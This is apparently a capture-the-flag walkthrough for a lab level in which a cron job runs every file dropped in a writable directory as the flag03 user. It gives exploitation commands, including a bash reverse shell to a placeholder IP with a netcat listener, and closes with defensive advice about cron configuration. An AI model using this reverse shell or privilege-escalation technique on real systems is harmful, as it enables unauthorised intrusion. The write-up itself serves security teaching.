
---
### üîç Challenge Description

> This level introduces a scenario where a **cron job** is set up to execute scripts dropped into a specific directory.
> 
> By analysing what the cron job does, we aim to **abuse this automation** to escalate privileges and retrieve the flag from `flag03`.

**Login:** `level03 : level03`  
**Directory of interest:** `/home/flag03/writable.d`

---

### üìÇ Initial Recon

Inside `/home/flag03`, we discover a shell script named `writable.sh`. This script is executed periodically via cron (every couple of minutes).

---

### üìú Crontab Script Code

```sh
#!/bin/sh

for i in /home/flag03/writable.d/* ; do
  (ulimit -t 5; bash -x "$i")
  rm -f "$i"
done
```

üìå **Breakdown:**

- Executes every file in `writable.d` using `bash -x`
    
- Limits CPU time per file to 5 seconds
    
- Deletes the file after execution
    
- Runs as **`flag03` user via cron**

This creates a perfect privilege escalation vector:

> **Anything you place in `writable.d` will be executed as `flag03`.**

---

### üéØ Objective

Drop a payload into `writable.d` that gets executed by the cron script with `flag03`'s privileges ‚Äî and use it to get a shell or run `getflag`.

---

### üí£ Exploitation Steps

#### Option 1: Quick Flag Grab (CTF-style)

Create a file that simply calls `getflag`:

```bash
echo "getflag > /tmp/flag03.txt" > /home/flag03/writable.d/flag.sh
chmod +x /home/flag03/writable.d/flag.sh
```

Wait ~2 minutes, then check:

```bash
cat /tmp/flag03.txt
```

‚úÖ Output:

```
You have successfully executed getflag on a target account
```

---

#### Option 2: Reverse Shell (Real-World Emulation)

On your **listener machine**:

```bash
nc -nvlp 4444
```

On the target:

```bash
echo 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' > /home/flag03/writable.d/shell.sh
chmod +x /home/flag03/writable.d/shell.sh
```

‚åõ Wait for the cronjob...  
Once executed, you'll get a shell as `flag03`.

Then:

```bash
getflag
```

---

### üß† Takeaway

This level demonstrates a real-world mis-configuration: **insecure cron jobs executing files from writable directories.**  
It emphasizes why you should never automate execution of **user-writable files** without verification or sandboxing.

üõ°Ô∏è **Security Tip:**  
Always validate, sanitize, and restrict execution rights in cron jobs, especially in shared environments.

---
